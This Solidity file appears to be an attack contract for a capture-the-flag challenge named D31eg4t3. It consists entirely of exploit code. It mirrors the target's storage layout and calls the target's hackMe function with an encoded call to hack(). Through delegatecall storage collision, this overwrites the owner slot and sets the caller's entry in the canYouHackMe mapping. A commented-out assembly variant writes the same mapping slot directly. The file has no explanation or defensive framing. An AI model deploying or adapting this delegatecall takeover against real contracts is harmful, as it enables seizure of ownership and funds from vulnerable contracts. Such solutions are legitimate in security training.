import "./D31eg4t3.sol";
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackDelegate {
    uint256 a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping(address => bool) public canYouHackMe; // slot 6

    function dcall(address _target) public {
        (bool r, ) = D31eg4t3(_target).hackMe(abi.encodeWithSignature("hack()", ""));
        require(r == true);
    }

    function hack() public {
        owner = msg.sender;
        // bytes32 slot = keccak256(abi.encode(msg.sender, 6));
        // assembly {
        //     sstore(slot,true)
        // }
        canYouHackMe[msg.sender] = true;
    }
}
